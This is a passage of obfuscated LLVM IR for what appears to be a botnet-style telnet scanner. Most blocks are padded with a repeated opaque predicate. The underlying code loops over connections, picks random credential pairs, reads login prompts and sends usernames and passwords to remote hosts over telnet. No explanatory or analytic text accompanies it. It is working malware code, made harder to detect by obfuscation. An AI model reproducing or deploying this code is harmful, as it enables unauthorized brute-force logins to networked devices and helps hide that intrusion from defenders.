originalBBpart283:                                ; preds = %originalBB81
  br label %842

; <label>:842:                                    ; preds = %originalBBpart283, %801
  br label %843

; <label>:843:                                    ; preds = %842, %796
  %844 = load i32, i32* @x.7
  %845 = load i32, i32* @y.8
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %843
  %852 = load i32, i32* @x.7
  %853 = load i32, i32* @y.8
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %860

; <label>:860:                                    ; preds = %originalBBpart287, %originalBBpart279
  %861 = load i32, i32* @x.7
  %862 = load i32, i32* @y.8
  %863 = sub i32 %861, 1
  %864 = mul i32 %861, %863
  %865 = urem i32 %864, 2
  %866 = icmp eq i32 %865, 0
  %867 = icmp slt i32 %862, 10
  %868 = or i1 %866, %867
  br i1 %868, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %860
  %869 = load i32, i32* @x.7
  %870 = load i32, i32* @y.8
  %871 = sub i32 %869, 1
  %872 = mul i32 %869, %871
  %873 = urem i32 %872, 2
  %874 = icmp eq i32 %873, 0
  %875 = icmp slt i32 %870, 10
  %876 = or i1 %874, %875
  br i1 %876, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %877

; <label>:877:                                    ; preds = %originalBBpart291, %748, %687
  %878 = load i32, i32* %1, align 4
  %879 = add nsw i32 %878, 1
  store i32 %879, i32* %1, align 4
  br label %641

; <label>:880:                                    ; preds = %originalBBpart267
  %881 = load i32, i32* @x.7
  %882 = load i32, i32* @y.8
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %880
  %889 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %889, align 8
  %890 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 1, i64* %890, align 8
  %891 = load i32, i32* %15, align 4
  %892 = load i32, i32* %14, align 4
  %893 = icmp sgt i32 %891, %892
  %894 = load i32, i32* @x.7
  %895 = load i32, i32* @y.8
  %896 = sub i32 %894, 1
  %897 = mul i32 %894, %896
  %898 = urem i32 %897, 2
  %899 = icmp eq i32 %898, 0
  %900 = icmp slt i32 %895, 10
  %901 = or i1 %899, %900
  br i1 %901, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %893, label %902, label %920

; <label>:902:                                    ; preds = %originalBBpart295
  %903 = load i32, i32* @x.7
  %904 = load i32, i32* @y.8
  %905 = sub i32 %903, 1
  %906 = mul i32 %903, %905
  %907 = urem i32 %906, 2
  %908 = icmp eq i32 %907, 0
  %909 = icmp slt i32 %904, 10
  %910 = or i1 %908, %909
  br i1 %910, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %902
  %911 = load i32, i32* %15, align 4
  %912 = load i32, i32* @x.7
  %913 = load i32, i32* @y.8
  %914 = sub i32 %912, 1
  %915 = mul i32 %912, %914
  %916 = urem i32 %915, 2
  %917 = icmp eq i32 %916, 0
  %918 = icmp slt i32 %913, 10
  %919 = or i1 %917, %918
  br i1 %919, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %938

; <label>:920:                                    ; preds = %originalBBpart295
  %921 = load i32, i32* @x.7
  %922 = load i32, i32* @y.8
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %920
  %929 = load i32, i32* %14, align 4
  %930 = load i32, i32* @x.7
  %931 = load i32, i32* @y.8
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %938

; <label>:938:                                    ; preds = %originalBBpart2103, %originalBBpart299
  %939 = phi i32 [ %911, %originalBBpart299 ], [ %929, %originalBBpart2103 ]
  %940 = load i32, i32* @x.7
  %941 = load i32, i32* @y.8
  %942 = sub i32 %940, 1
  %943 = mul i32 %940, %942
  %944 = urem i32 %943, 2
  %945 = icmp eq i32 %944, 0
  %946 = icmp slt i32 %941, 10
  %947 = or i1 %945, %946
  br i1 %947, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %938
  %948 = add nsw i32 1, %939
  %949 = call i32 @select(i32 %948, %struct.__sigset_t* %8, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %11)
  %950 = call i64 @time(i64* null) #7
  %951 = trunc i64 %950 to i32
  store i32 %951, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  %952 = load i32, i32* @x.7
  %953 = load i32, i32* @y.8
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBBpart2110, label %originalBB105alteredBB

originalBBpart2110:                               ; preds = %originalBB105
  br label %960

; <label>:960:                                    ; preds = %2141, %originalBBpart2110
  %961 = load i32, i32* %1, align 4
  %962 = icmp slt i32 %961, 628
  br i1 %962, label %963, label %2144

; <label>:963:                                    ; preds = %960
  %964 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %965 = load i32, i32* %1, align 4
  %966 = sext i32 %965 to i64
  %967 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %964, i64 %966
  store %struct.scanner_connection* %967, %struct.scanner_connection** %10, align 8
  %968 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %969 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %968, i32 0, i32 2
  %970 = load i32, i32* %969, align 8
  %971 = icmp eq i32 %970, -1
  br i1 %971, label %972, label %973

; <label>:972:                                    ; preds = %963
  br label %2141

; <label>:973:                                    ; preds = %963
  %974 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %975 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %976 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %975, i32 0, i32 2
  %977 = load i32, i32* %976, align 8
  %978 = sdiv i32 %977, 64
  %979 = sext i32 %978 to i64
  %980 = getelementptr inbounds [16 x i64], [16 x i64]* %974, i64 0, i64 %979
  %981 = load i64, i64* %980, align 8
  %982 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %983 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %982, i32 0, i32 2
  %984 = load i32, i32* %983, align 8
  %985 = srem i32 %984, 64
  %986 = zext i32 %985 to i64
  %987 = shl i64 1, %986
  %988 = and i64 %981, %987
  %989 = icmp ne i64 %988, 0
  br i1 %989, label %990, label %1040

; <label>:990:                                    ; preds = %973
  store i32 0, i32* %32, align 4
  store i32 4, i32* %33, align 4
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 2
  %993 = load i32, i32* %992, align 8
  %994 = bitcast i32* %32 to i8*
  %995 = call i32 @getsockopt(i32 %993, i32 1, i32 4, i8* %994, i32* %33) #7
  %996 = load i32, i32* %32, align 4
  %997 = icmp ne i32 %996, 0
  br i1 %997, label %998, label %1009

; <label>:998:                                    ; preds = %990
  %999 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1000 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %999, i32 0, i32 2
  %1001 = load i32, i32* %1000, align 8
  %1002 = call i32 @close(i32 %1001)
  %1003 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1004 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1003, i32 0, i32 2
  store i32 -1, i32* %1004, align 8
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1006 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1005, i32 0, i32 9
  store i8 0, i8* %1006, align 4
  %1007 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1008 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1007, i32 0, i32 16
  store i32 0, i32* %1008, align 8
  br label %2141

; <label>:1009:                                   ; preds = %990
  %1010 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1011 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1010, i32 0, i32 16
  store i32 2, i32* %1011, align 8
  %1012 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1013 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1012, i32 0, i32 1
  %1014 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1013, i32 0, i32 0
  %1015 = load i32, i32* %1014, align 8
  %1016 = icmp ne i32 %1015, 0
  br i1 %1016, label %1021, label %1017

; <label>:1017:                                   ; preds = %1009
  %1018 = call %struct.scanner_auth* @random_auth_entry()
  %1019 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1020 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1019, i32 0, i32 0
  store %struct.scanner_auth* %1018, %struct.scanner_auth** %1020, align 8
  br label %1021

; <label>:1021:                                   ; preds = %1017, %1009
  %1022 = load i32, i32* @x.7
  %1023 = load i32, i32* @y.8
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %1021
  %1030 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1031 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1030, i32 0, i32 4
  store i32 0, i32* %1031, align 8
  %1032 = load i32, i32* @x.7
  %1033 = load i32, i32* @y.8
  %1034 = sub i32 %1032, 1
  %1035 = mul i32 %1032, %1034
  %1036 = urem i32 %1035, 2
  %1037 = icmp eq i32 %1036, 0
  %1038 = icmp slt i32 %1033, 10
  %1039 = or i1 %1037, %1038
  br i1 %1039, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %1040

; <label>:1040:                                   ; preds = %originalBBpart2114, %973
  %1041 = load i32, i32* @x.7
  %1042 = load i32, i32* @y.8
  %1043 = sub i32 %1041, 1
  %1044 = mul i32 %1041, %1043
  %1045 = urem i32 %1044, 2
  %1046 = icmp eq i32 %1045, 0
  %1047 = icmp slt i32 %1042, 10
  %1048 = or i1 %1046, %1047
  br i1 %1048, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %1040
  %1049 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %1050 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1051 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1050, i32 0, i32 2
  %1052 = load i32, i32* %1051, align 8
  %1053 = sdiv i32 %1052, 64
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds [16 x i64], [16 x i64]* %1049, i64 0, i64 %1054
  %1056 = load i64, i64* %1055, align 8
  %1057 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1058 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1057, i32 0, i32 2
  %1059 = load i32, i32* %1058, align 8
  %1060 = srem i32 %1059, 64
  %1061 = zext i32 %1060 to i64
  %1062 = shl i64 1, %1061
  %1063 = and i64 %1056, %1062
  %1064 = icmp ne i64 %1063, 0
  %1065 = load i32, i32* @x.7
  %1066 = load i32, i32* @y.8
  %1067 = sub i32 %1065, 1
  %1068 = mul i32 %1065, %1067
  %1069 = urem i32 %1068, 2
  %1070 = icmp eq i32 %1069, 0
  %1071 = icmp slt i32 %1066, 10
  %1072 = or i1 %1070, %1071
  br i1 %1072, label %originalBBpart2138, label %originalBB116alteredBB

originalBBpart2138:                               ; preds = %originalBB116
  br i1 %1064, label %1073, label %2140

; <label>:1073:                                   ; preds = %originalBBpart2138
  br label %1074

; <label>:1074:                                   ; preds = %2138, %1073
  %1075 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1076 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1075, i32 0, i32 16
  %1077 = load i32, i32* %1076, align 8
  %1078 = icmp eq i32 %1077, 0
  br i1 %1078, label %1079, label %1080

; <label>:1079:                                   ; preds = %1074
  br label %2139

; <label>:1080:                                   ; preds = %1074
  %1081 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1082 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1081, i32 0, i32 4
  %1083 = load i32, i32* %1082, align 8
  %1084 = icmp sgt i32 %1083, 7168
  br i1 %1084, label %1085, label %1097

; <label>:1085:                                   ; preds = %1080
  %1086 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1087 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1086, i32 0, i32 7
  %1088 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1087, i32 0, i32 0
  %1089 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1090 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1089, i32 0, i32 7
  %1091 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1090, i32 0, i32 0
  %1092 = getelementptr inbounds i8, i8* %1091, i64 6144
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1088, i8* %1092, i64 2048, i32 1, i1 false)
  %1093 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1094 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1093, i32 0, i32 4
  %1095 = load i32, i32* %1094, align 8
  %1096 = sub nsw i32 %1095, 6144
  store i32 %1096, i32* %1094, align 8
  br label %1097

; <label>:1097:                                   ; preds = %1085, %1080
  %1098 = load i32, i32* @x.7
  %1099 = load i32, i32* @y.8
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1097
  %1106 = call i32* @__errno_location() #9
  store i32 0, i32* %1106, align 4
  %1107 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1107, i32 0, i32 2
  %1109 = load i32, i32* %1108, align 8
  %1110 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1111 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1110, i32 0, i32 7
  %1112 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1111, i32 0, i32 0
  %1113 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1114 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1113, i32 0, i32 4
  %1115 = load i32, i32* %1114, align 8
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds i8, i8* %1112, i64 %1116
  %1118 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1119 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1118, i32 0, i32 4
  %1120 = load i32, i32* %1119, align 8
  %1121 = sub nsw i32 8192, %1120
  %1122 = call i32 @recv_strip_null(i32 %1109, i8* %1117, i32 %1121, i32 16384)
  store i32 %1122, i32* %34, align 4
  %1123 = load i32, i32* %34, align 4
  %1124 = icmp eq i32 %1123, 0
  %1125 = load i32, i32* @x.7
  %1126 = load i32, i32* @y.8
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBBpart2150, label %originalBB140alteredBB

originalBBpart2150:                               ; preds = %originalBB140
  br i1 %1124, label %1133, label %1151

; <label>:1133:                                   ; preds = %originalBBpart2150
  %1134 = load i32, i32* @x.7
  %1135 = load i32, i32* @y.8
  %1136 = sub i32 %1134, 1
  %1137 = mul i32 %1134, %1136
  %1138 = urem i32 %1137, 2
  %1139 = icmp eq i32 %1138, 0
  %1140 = icmp slt i32 %1135, 10
  %1141 = or i1 %1139, %1140
  br i1 %1141, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %1133
  %1142 = call i32* @__errno_location() #9
  store i32 104, i32* %1142, align 4
  store i32 -1, i32* %34, align 4
  %1143 = load i32, i32* @x.7
  %1144 = load i32, i32* @y.8
  %1145 = sub i32 %1143, 1
  %1146 = mul i32 %1143, %1145
  %1147 = urem i32 %1146, 2
  %1148 = icmp eq i32 %1147, 0
  %1149 = icmp slt i32 %1144, 10
  %1150 = or i1 %1148, %1149
  br i1 %1150, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br label %1151

; <label>:1151:                                   ; preds = %originalBBpart2154, %originalBBpart2150
  %1152 = load i32, i32* %34, align 4
  %1153 = icmp eq i32 %1152, -1
  br i1 %1153, label %1154, label %1213

; <label>:1154:                                   ; preds = %1151
  %1155 = load i32, i32* @x.7
  %1156 = load i32, i32* @y.8
  %1157 = sub i32 %1155, 1
  %1158 = mul i32 %1155, %1157
  %1159 = urem i32 %1158, 2
  %1160 = icmp eq i32 %1159, 0
  %1161 = icmp slt i32 %1156, 10
  %1162 = or i1 %1160, %1161
  br i1 %1162, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1154
  %1163 = call i32* @__errno_location() #9
  %1164 = load i32, i32* %1163, align 4
  %1165 = icmp ne i32 %1164, 11
  %1166 = load i32, i32* @x.7
  %1167 = load i32, i32* @y.8
  %1168 = sub i32 %1166, 1
  %1169 = mul i32 %1166, %1168
  %1170 = urem i32 %1169, 2
  %1171 = icmp eq i32 %1170, 0
  %1172 = icmp slt i32 %1167, 10
  %1173 = or i1 %1171, %1172
  br i1 %1173, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br i1 %1165, label %1174, label %1212

; <label>:1174:                                   ; preds = %originalBBpart2158
  %1175 = load i32, i32* @x.7
  %1176 = load i32, i32* @y.8
  %1177 = sub i32 %1175, 1
  %1178 = mul i32 %1175, %1177
  %1179 = urem i32 %1178, 2
  %1180 = icmp eq i32 %1179, 0
  %1181 = icmp slt i32 %1176, 10
  %1182 = or i1 %1180, %1181
  br i1 %1182, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1174
  %1183 = call i32* @__errno_location() #9
  %1184 = load i32, i32* %1183, align 4
  %1185 = icmp ne i32 %1184, 11
  %1186 = load i32, i32* @x.7
  %1187 = load i32, i32* @y.8
  %1188 = sub i32 %1186, 1
  %1189 = mul i32 %1186, %1188
  %1190 = urem i32 %1189, 2
  %1191 = icmp eq i32 %1190, 0
  %1192 = icmp slt i32 %1187, 10
  %1193 = or i1 %1191, %1192
  br i1 %1193, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br i1 %1185, label %1194, label %1212

; <label>:1194:                                   ; preds = %originalBBpart2162
  %1195 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1196 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1195, i32 0, i32 2
  %1197 = load i32, i32* %1196, align 8
  %1198 = call i32 @close(i32 %1197)
  %1199 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1200 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1199, i32 0, i32 2
  store i32 -1, i32* %1200, align 8
  %1201 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1202 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1201, i32 0, i32 9
  %1203 = load i8, i8* %1202, align 4
  %1204 = add i8 %1203, 1
  store i8 %1204, i8* %1202, align 4
  %1205 = zext i8 %1204 to i32
  %1206 = icmp sge i32 %1205, 10
  br i1 %1206, label %1207, label %1209

; <label>:1207:                                   ; preds = %1194
  %1208 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1208, i32 1)
  br label %1211

; <label>:1209:                                   ; preds = %1194
  %1210 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %1210)
  br label %1211

; <label>:1211:                                   ; preds = %1209, %1207
  br label %1212

; <label>:1212:                                   ; preds = %1211, %originalBBpart2162, %originalBBpart2158
  br label %2139

; <label>:1213:                                   ; preds = %1151
  %1214 = load i32, i32* @x.7
  %1215 = load i32, i32* @y.8
  %1216 = sub i32 %1214, 1
  %1217 = mul i32 %1214, %1216
  %1218 = urem i32 %1217, 2
  %1219 = icmp eq i32 %1218, 0
  %1220 = icmp slt i32 %1215, 10
  %1221 = or i1 %1219, %1220
  br i1 %1221, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %1213
  %1222 = load i32, i32* %34, align 4
  %1223 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1224 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1223, i32 0, i32 4
  %1225 = load i32, i32* %1224, align 8
  %1226 = add nsw i32 %1225, %1222
  store i32 %1226, i32* %1224, align 8
  %1227 = load i32, i32* @fake_time, align 4
  %1228 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1229 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1228, i32 0, i32 3
  store i32 %1227, i32* %1229, align 4
  %1230 = load i32, i32* @x.7
  %1231 = load i32, i32* @y.8
  %1232 = sub i32 %1230, 1
  %1233 = mul i32 %1230, %1232
  %1234 = urem i32 %1233, 2
  %1235 = icmp eq i32 %1234, 0
  %1236 = icmp slt i32 %1231, 10
  %1237 = or i1 %1235, %1236
  br i1 %1237, label %originalBBpart2174, label %originalBB164alteredBB

originalBBpart2174:                               ; preds = %originalBB164
  br label %1238

; <label>:1238:                                   ; preds = %2137, %originalBBpart2174
  store i32 0, i32* %35, align 4
  %1239 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1240 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1239, i32 0, i32 16
  %1241 = load i32, i32* %1240, align 8
  switch i32 %1241, label %2080 [
    i32 2, label %1242
    i32 3, label %1266
    i32 4, label %1299
    i32 5, label %1348
    i32 6, label %1451
    i32 7, label %1548
    i32 8, label %1614
    i32 9, label %1643
    i32 10, label %1704
    i32 12, label %1750
    i32 11, label %1862
    i32 13, label %1983
  ]

; <label>:1242:                                   ; preds = %1238
  %1243 = load i32, i32* @x.7
  %1244 = load i32, i32* @y.8
  %1245 = sub i32 %1243, 1
  %1246 = mul i32 %1243, %1245
  %1247 = urem i32 %1246, 2
  %1248 = icmp eq i32 %1247, 0
  %1249 = icmp slt i32 %1244, 10
  %1250 = or i1 %1248, %1249
  br i1 %1250, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %1242
  %1251 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1252 = call i32 @consume_iacs(%struct.scanner_connection* %1251)
  store i32 %1252, i32* %35, align 4
  %1253 = icmp sgt i32 %1252, 0
  %1254 = load i32, i32* @x.7
  %1255 = load i32, i32* @y.8
  %1256 = sub i32 %1254, 1
  %1257 = mul i32 %1254, %1256
  %1258 = urem i32 %1257, 2
  %1259 = icmp eq i32 %1258, 0
  %1260 = icmp slt i32 %1255, 10
  %1261 = or i1 %1259, %1260
  br i1 %1261, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br i1 %1253, label %1262, label %1265

; <label>:1262:                                   ; preds = %originalBBpart2178
  %1263 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1264 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1263, i32 0, i32 16
  store i32 3, i32* %1264, align 8
  br label %1265

; <label>:1265:                                   ; preds = %1262, %originalBBpart2178
  br label %2081

; <label>:1266:                                   ; preds = %1238
  %1267 = load i32, i32* @x.7
  %1268 = load i32, i32* @y.8
  %1269 = sub i32 %1267, 1
  %1270 = mul i32 %1267, %1269
  %1271 = urem i32 %1270, 2
  %1272 = icmp eq i32 %1271, 0
  %1273 = icmp slt i32 %1268, 10
  %1274 = or i1 %1272, %1273
  br i1 %1274, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %1266
  %1275 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1276 = call i32 @consume_login_prompt(%struct.scanner_connection* %1275, i32 1)
  store i32 %1276, i32* %35, align 4
  %1277 = icmp sgt i32 %1276, 0
  %1278 = load i32, i32* @x.7
  %1279 = load i32, i32* @y.8
  %1280 = sub i32 %1278, 1
  %1281 = mul i32 %1278, %1280
  %1282 = urem i32 %1281, 2
  %1283 = icmp eq i32 %1282, 0
  %1284 = icmp slt i32 %1279, 10
  %1285 = or i1 %1283, %1284
  br i1 %1285, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %1277, label %1286, label %1298

; <label>:1286:                                   ; preds = %originalBBpart2182
  %1287 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1288 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1287, i32 0, i32 2
  %1289 = load i32, i32* %1288, align 8
  %1290 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1291 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1290, i32 0, i32 0
  %1292 = load %struct.scanner_auth*, %struct.scanner_auth** %1291, align 8
  %1293 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1292, i32 0, i32 0
  %1294 = load i8*, i8** %1293, align 8
  %1295 = call i32 (i32, i8*, ...) @fdsend(i32 %1289, i8* %1294)
  %1296 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1297 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1296, i32 0, i32 16
  store i32 4, i32* %1297, align 8
  br label %1298

; <label>:1298:                                   ; preds = %1286, %originalBBpart2182
  br label %2081

; <label>:1299:                                   ; preds = %1238
  %1300 = load i32, i32* @x.7
  %1301 = load i32, i32* @y.8
  %1302 = sub i32 %1300, 1
  %1303 = mul i32 %1300, %1302
  %1304 = urem i32 %1303, 2
  %1305 = icmp eq i32 %1304, 0
  %1306 = icmp slt i32 %1301, 10
  %1307 = or i1 %1305, %1306
  br i1 %1307, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1299
  %1308 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1309 = call i32 @consume_login_prompt(%struct.scanner_connection* %1308, i32 0)
  store i32 %1309, i32* %35, align 4
  %1310 = icmp sgt i32 %1309, 0
  %1311 = load i32, i32* @x.7
  %1312 = load i32, i32* @y.8
  %1313 = sub i32 %1311, 1
  %1314 = mul i32 %1311, %1313
  %1315 = urem i32 %1314, 2
  %1316 = icmp eq i32 %1315, 0
  %1317 = icmp slt i32 %1312, 10
  %1318 = or i1 %1316, %1317
  br i1 %1318, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br i1 %1310, label %1319, label %1331

; <label>:1319:                                   ; preds = %originalBBpart2186
  %1320 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1321 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1320, i32 0, i32 2
  %1322 = load i32, i32* %1321, align 8
  %1323 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1324 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1323, i32 0, i32 0
  %1325 = load %struct.scanner_auth*, %struct.scanner_auth** %1324, align 8
  %1326 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1325, i32 0, i32 1
  %1327 = load i8*, i8** %1326, align 8
